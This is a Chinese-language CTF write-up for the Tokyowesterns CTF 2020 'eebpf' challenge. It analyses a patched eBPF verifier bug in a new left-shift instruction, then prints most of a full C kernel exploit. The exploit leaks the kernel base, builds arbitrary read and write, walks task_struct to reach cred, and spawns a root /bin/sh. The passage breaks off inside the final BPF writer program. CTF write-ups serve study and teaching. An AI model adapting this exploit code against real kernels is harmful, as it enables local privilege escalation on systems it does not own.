# eebpf-Tokyowesterns CTF 2020


# eebpf

一道来自Tokyowesterns CTF 2020的内核题目。在做题之前，需要学习ebpf的相关知识。这里有一篇我的[笔记](https://daisy-innocent-485.notion.site/eBPF-9fe6dd95eba3492fa1cfe17501be845c)。

## Bug

题目patch了一个新的指令

原始左移:

```c
struct tnum tnum_lshift(struct tnum a, u8 shift)
{
	return TNUM(a.value << shift, a.mask << shift);
}

case BPF_LSH:
		if (umax_val >= insn_bitness) {
			/* Shifts greater than 31 or 63 are undefined.
			 * This includes shifts by a negative number.
			 */
			mark_reg_unknown(env, regs, insn->dst_reg);
			break;
		}
		/* We lose all sign bit information (except what we can pick
		 * up from var_off)
		 */
		dst_reg->smin_value = S64_MIN;
		dst_reg->smax_value = S64_MAX;
		/* If we might shift our top bit out, then we know nothing */
		if (dst_reg->umax_value > 1ULL << (63 - umax_val)) {
			dst_reg->umin_value = 0;
			dst_reg->umax_value = U64_MAX;
		} else {
			dst_reg->umin_value <<= umin_val;
			dst_reg->umax_value <<= umax_val;
		}
		dst_reg->var_off = tnum_lshift(dst_reg->var_off, umin_val);
		/* We may learn something more from the var_off */
		__update_reg_bounds(dst_reg);
		break;
```

Patch:

```c
struct tnum tnum_alshift(struct tnum a, u8 min_shift, u8 insn_bitness)
{
	if (insn_bitness == 32)
		//Never reach here now.
		return TNUM((u32)(((s32)a.value) << min_shift),
			    (u32)(((s32)a.mask)  << min_shift));
	else
		return TNUM((s64)a.value << min_shift,
			    (s64)a.mask  << min_shift);
} 	

	case BPF_ALSH:
 		if (umax_val >= insn_bitness) {
 			/* Shifts greater than 31 or 63 are undefined.
 			 * This includes shifts by a negative number.
 			 */
 			mark_reg_unknown(env, regs, insn->dst_reg);
 			break;
 		}
 
 		/* Upon reaching here, src_known is true and
 		 * umax_val is equal to umin_val.
 		 */
 		if (insn_bitness == 32) {
 			//Now we don't support 32bit. Cuz im too lazy.
 			mark_reg_unknown(env, regs, insn->dst_reg);
 			break;
 		} else {
 			dst_reg->smin_value <<= umin_val;
 			dst_reg->smax_value <<= umin_val;
 		}
 
 		dst_reg->var_off = tnum_alshift(dst_reg->var_off, umin_val,
 						insn_bitness);
 
 		/* blow away the dst_reg umin_value/umax_value and rely on
 		 * dst_reg var_off to refine the result.
 		 */
 		dst_reg->umin_value = 0;
 		dst_reg->umax_value = U64_MAX;
 		__update_reg_bounds(dst_reg);
 		break;
```

Update;

```c
/* Attempts to improve min/max values based on var_off information */
static void __update_reg_bounds(struct bpf_reg_state *reg)
{
	/* min signed is max(sign bit) | min(other bits) */
	reg->smin_value = max_t(s64, reg->smin_value,
				reg->var_off.value | (reg->var_off.mask & S64_MIN));
	/* max signed is min(sign bit) | max(other bits) */
	reg->smax_value = min_t(s64, reg->smax_value,
				reg->var_off.value | (reg->var_off.mask & S64_MAX));
	reg->umin_value = max(reg->umin_value, reg->var_off.value);
	reg->umax_value = min(reg->umax_value,
			      reg->var_off.value | reg->var_off.mask);
}

struct bpf_array {
	struct bpf_map map;
	u32 elem_size;
	u32 index_mask;
	/* 'ownership' of prog_array is claimed by the first program that
	 * is going to use this map or by the first program which FD is stored
	 * in the map to make sure that all callers and callees have the same
	 * prog_type and JITed flag
	 */
	enum bpf_prog_type owner_prog_type;
	bool owner_jited;
	union {
		char value[0] __aligned(8);
		void *ptrs[0] __aligned(8);
		void __percpu *pptrs[0] __aligned(8);
	};
};
```

丢失 `sign bit`可能导致 `smax_value < smin_value` 。让我们试验以下情况：

```c
r1 = array[0](= 0)
/* verfier
r1->smin = 0
r1->smax = 2^62 
*/
r2 = array[1](= 1)
/* verfier
r1->smin = 0
r1->smax = 2^62 
*/
r1 &= 1
/* verfier
r1->smin = 0
r1->smax = 1
*/
r2 &= 1
/* verfier
r2->smin = 0
r2->smax = 1
*/
ALSH(r1, 63)
/* verfier
r1->smin = 0
r1->smax = 0x8000000000000000
*/
ARSH(r1, 63)
/* verfier
r1->smin = 0
r1->smax = -1
*/
r3 = r1 + r2
/* verfier
r3->smin = 0
r3->smax = 0
*/
// ! but r1 + r2 == 1 !!
```

这样绕过了verfier的检查，使我们可以越界访问数据。

## leak

首先，泄漏内核地址。我们可以越界读取，`bpf_map->map_ops`得到内核地址。

```c
  struct bpf_insn prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0]

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),          // key = [r2] = 1;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[0]

      BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3),         // r6 &= 1    (0, 1)
      BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),       // r6 <<= 63
      BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),       // r6 >>= 63  (0, -1)
      BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),         // r7 &= 1    (0, 1)
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7), // r6 += r7   (0, 0)
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),     // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xd0),

      BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0), // write address in array[0]
      BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_3, 0),

      BPF_MOV64_IMM(BPF_REG_0, 0),
      BPF_EXIT_INSN()

  };
```

## AAR

得到kernbase后，通过`bpf_map_get_info_by_id`，如果`map->btf`不为空，则可以读取btf+0x58地址的四字节数据。通过修改btf指针，可以实现任意地址读。

```c
	if (map->btf) {
		info.btf_id = btf_id(map->btf);
		info.btf_key_type_id = map->btf_key_type_id;
		info.btf_value_type_id = map->btf_value_type_id;
	}
	[...]
	if (copy_to_user(uinfo, &info, info_len) ||
	    put_user(info_len, &uattr->info.info_len))
		return -EFAULT;
```

为了绕过verfier的检查，我们把目标地址提前写到map中，然后在程序中读取即可。

通过调试，可以找到`init_task`的地址，然后遍历其进程链表，找到当前程序的`task_struct`就能得到当前程序的cred。

由于这些结构中有很多内核编译选项控制的字段，所以具体的偏移还要通过调试才能得到。

## AAW

下面我们需要对cred进行覆盖，寻找合适的利用进行任意地址写。

```c
static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)
{
	struct bpf_array *array = container_of(map, struct bpf_array, map);
	u32 index = key ? *(u32 *)key : U32_MAX;
	u32 *next = (u32 *)next_key;
 
	if (index >= array->map.max_entries) {
		*next = 0;
		return 0;
	}
 
	if (index == array->map.max_entries - 1)
		return -ENOENT;
 
	*next = index + 1;
	return 0;
}
```

上面的函数`key`和`next_key`由我们控制，可以将任意地址写入0或`index+1`。下面的函数的参数与这个函数几乎相同，可以帮助我们设置。

```c
int bpf_map_push_elem(struct bpf_map *map, const void *value, u64 flags)
```

在`flags`填入目标地址，value填入目标值。我们可以设置`array->map.max_entries`为0xffffffff，这样就可以使目的地址值为0，同时扩大了我们可以写的值的范围。但是这个函数只有在map类型为`BPF_MAP_TYPE_STACK` or `BPF_MAP_TYPE_QUEUE`才会被调用，所以还要修改map的类型。

- 劫持`map->map_ops`到提前构造的虚表
- 修改`map->type`为`BPF_MAP_TYPE_STACK`
- 修改`map->max_entries`为0xffffffff
- 修改`map->spin_lock_off`为0，以绕过其他的检查

在伪造的虚表中，`bpf_map_push_elem`指针需要被替换为`array_map_get_next_key`

# The full exp

```c
#define _GNU_SOURCE
#include <linux/bpf_common.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>
#include "bpf_insn.h"

#define PAGE_SIZE 4096
#define BPF_ALSH 0xe0

#define HELLO_MSG "I am Niebelungen, let me in!"
#define MSG_LEN 28

void die(const char *msg) {
  perror(msg);
  exit(-1);
}

int global_fd;
uint64_t kernbase;
int read_map, write_map;
int control_map;
int reader_fd, reader_sock;
int writer_fd, writer_sock;

int _bpf(int cmd, union bpf_attr *attr, uint32_t size) {
  return syscall(__NR_bpf, cmd, attr, size);
}

int create_map(int value_size, int cnt) {
  int map_fd;
  union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY,
                         .key_size = 4,
                         .value_size = value_size,
                         .max_entries = cnt};

  map_fd = _bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
  if (map_fd < 0) {
    die("[!] Error creating map");
  }
  printf("[+] created map: %d\n\tvalue size: %d\n\tcnt: %d\n", map_fd,
         value_size, cnt);
  return map_fd;
}

int prog_load(struct bpf_insn *prog, int insn_cnt) {
  int prog_fd;
  char log_buf[0xf000];
  union bpf_attr attr = {
      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
      .insn_cnt = insn_cnt,
      .insns = (uint64_t)prog,
      .license = (uint64_t) "GPL",
      .log_level = 2,
      .log_size = sizeof(log_buf),
      .log_buf = (uint64_t)log_buf,
  };

  prog_fd = _bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
  // printf("[+] log_buf: %s\nLOG_END\n", log_buf);
  if (prog_fd < 0) {
    die("[!] Failed to load BPF prog!");
  }
  return prog_fd;
}

int update_item(int fd, int idx, uint64_t value) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (uint64_t)&idx,
      .value = (uint64_t)&value,
      .flags = BPF_ANY,
  };
  // printf("[+] update_item;\n\tmap_fd: %d\n\tidx: 0x%x\n\tvalue: 0x%lx\n", fd,
  // idx, value);
  return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

uint64_t get_item(int fd, uint64_t idx) {
  char value[0x800];
  uint64_t index = idx;
  union bpf_attr *attr = calloc(1, sizeof(union bpf_attr));
  attr->map_fd = fd;
  attr->key = (uint64_t)&idx;
  attr->value = (uint64_t)value;

  if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) < 0) {
    die("[!] Failed to lookup");
  }

  return *(uint64_t *)value;
}

uint32_t READ32(uint64_t target) {
  update_item(control_map, 0, 0);
  update_item(control_map, 1, 1);
  update_item(control_map, 2, target - 0x58);

  if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }

  struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info));

  union bpf_attr push_attr = {
      .info.bpf_fd = read_map,
      .info.info_len = sizeof(*info),
      .info.info = (uint64_t)info,
  };
  if (_bpf(BPF_OBJ_GET_INFO_BY_FD, &push_attr, sizeof(push_attr)) < 0) {
    die("[!] Failed to get push");
  }
  return info->btf_id;
}

uint64_t READ64(uint64_t target) {
  uint64_t low = READ32(target);
  uint64_t high = READ32(target + 4);
  return low + (high << 32);
}

uint64_t leak_kernel() {
  int leak_fd;
  struct bpf_insn prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0]

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),          // key = [r2] = 1;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[0]

      BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3),         // r6 &= 1    (0, 1)
      BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),       // r6 <<= 63
      BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),       // r6 >>= 63  (0, -1)
      BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),         // r7 &= 1    (0, 1)
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7), // r6 += r7   (0, 0)
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),     // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xd0),

      BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0), // write address in array[0]
      BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_3, 0),

      BPF_MOV64_IMM(BPF_REG_0, 0),
      BPF_EXIT_INSN()

  };
  int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
  // printf("[+] insn_cnt = %d\n", insn_cnt);
  leak_fd = prog_load(prog, insn_cnt);
  printf("[+] leak_fd = %d\n", leak_fd);
  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0) {
    die("[!] Failed in socketpair");
  }

  if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &leak_fd,
                 sizeof(leak_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] leak ATTACH_BPF");

  if (send(sockets[1], HELLO_MSG, MSG_LEN, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }
  uint64_t leak = get_item(read_map, 0);
  printf("[+] leak: 0x%lx\n", leak);

  return leak;
}

int copy_maps(uint64_t target) {
  uint64_t *maps = calloc(1, 0x700);
  for (int i = 0; i < 21; i++) {
    maps[i] = READ64(target + 8 * i);
  }
  maps[10] = maps[4];
  uint32_t idx = 0;
  union bpf_attr attr = {
      .map_fd = write_map,
      .key = (uint64_t)&idx,
      .value = (uint64_t)maps,
      .flags = BPF_ANY,
  };
  // printf("[+] maps[0]: 0x%lx\n", maps[0]);
  return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

void aaw2zero(uint64_t target) {
  uint64_t key = 0;
  uint64_t value = 0xffffffff;
  union bpf_attr *w_attr = calloc(1, sizeof(union bpf_attr));
  w_attr->map_fd = write_map;
  w_attr->key = (uint64_t)&key;
  w_attr->value = (uint64_t)&value;
  w_attr->flags = target;
  // sleep(5);
  if (_bpf(BPF_MAP_UPDATE_ELEM, w_attr, sizeof(*w_attr)) < 0) {
    die("[!] Error updating");
  }
}

void pop_shell() {
  if (!getuid()) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[*] Root! :)");
    execve("/bin/sh", argv, envp);
  } else {
    die("[!] spawn shell error!\n");
  }
}

int main() {
  int i;
  uint64_t key, value;
  control_map = create_map(0x8, 10);
  read_map = create_map(0x700, 1);
  write_map = create_map(0x700, 1);

  update_item(control_map, 0, 0);
  update_item(control_map, 1, 1);
  update_item(read_map, 0, 0xdeadbeef);

  uint64_t leak = leak_kernel();
  kernbase = leak - 0xa0dec0;
  uint64_t init_task = kernbase + 0xc114c0;
  uint64_t array_map_ops = kernbase + 0xa0dec0;
  printf("[+] kernbase: 0x%lx\n", kernbase);
  printf("[+] array_map_ops: 0x%lx\n", array_map_ops);
  printf("[+] init_task: 0x%lx\n", init_task);

  struct bpf_insn read_prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0]

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),          // key = [r2] = 1;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[1]

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 2),          // key = [r2] = 2;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0), // r9 = array[2]

      BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3),         // r6 &= 1    (0, 1)
      BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),       // r6 <<= 63
      BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),       // r6 >>= 63  (0, -1)
      BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),         // r7 &= 1    (0, 1)
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7), // r6 += r7   (0, 0)
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),     // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),     // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xd0 - 0x38), // r8 = &map->btf

      BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0), // overwrite btf to target

      BPF_MOV64_IMM(BPF_REG_0, 0),
      BPF_EXIT_INSN()};
  reader_fd = prog_load(read_prog, sizeof(read_prog) / sizeof(struct bpf_insn));
  printf("[+] reader_fd = %d\n", reader_fd);
  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0) {
    die("[!] Failed in socketpair");
  }
  if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &reader_fd,
                 sizeof(reader_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] Reader ATTACH_BPF");
  reader_sock = sockets[1];

  pid_t pid = getpid();
  printf("[+] self pid: %d\n", pid);

  puts("[+] searching task_struct...");
  uint64_t cur = init_task;
  for (;;) {
    cur = READ64(cur + 0x268) - 0x260; // cur = cur->next
    if (cur == init_task) {
      die("[!] task_struct not found");
    }
    pid_t cur_pid = READ32(cur + 0x360); // next->pid
    if (cur_pid == pid) {
      break;
    }
  }
  // bpf_map_get_info_by_fd: 0xffffffff810c5130
  // offset(btf,id) 0x58
  // offset(map, btf) 0x38
  // offset(map, spin_lock_off) 0x24
  // offset(task_struct, pid) 0x360
  // offset(task_struct, tasks) 0x260 0x268
  uint64_t cred = READ64(cur + 0x500);
  printf("[+] task_struct: 0x%lx\n", cur);
  printf("[+] cred: 0x%lx\n", cred);
  assert(cred == READ64(cur + 0x4f8));
  uint64_t files = READ64(cur + 0x540);
  printf("[+] files: 0x%lx\n", files);
  uint64_t write_map_file = READ64(files + 0xa0 + 8 * write_map);
  uint64_t write_map_addr = READ64(write_map_file + 0xc0);
  printf("[+] write_map_addr: 0x%lx\n", write_map_addr);
  copy_maps(array_map_ops);
  READ64(write_map_addr + 0x100);

  update_item(control_map, 0, 0);
  update_item(control_map, 1, 1);
  update_item(control_map, 2, write_map_addr + 0xd0); // fake map ops

  struct bpf_insn writer_prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0]

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),          // key = [r2] = 1;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[1]

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 2),          // key = [r2] = 2;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0), // r9 = array[2]
                                                    //
      BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3),         // r6 &= 1    (0, 1)
      BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),       // r6 <<= 63
      BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),       // r6 >>= 63  (0, -1)
      BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),         // r7 &= 1    (0, 1)
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7), // r6 += r7   (0, 0)
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),     // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, write_map),     // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),     // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),

      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xd0),      // r8 = &map->ops
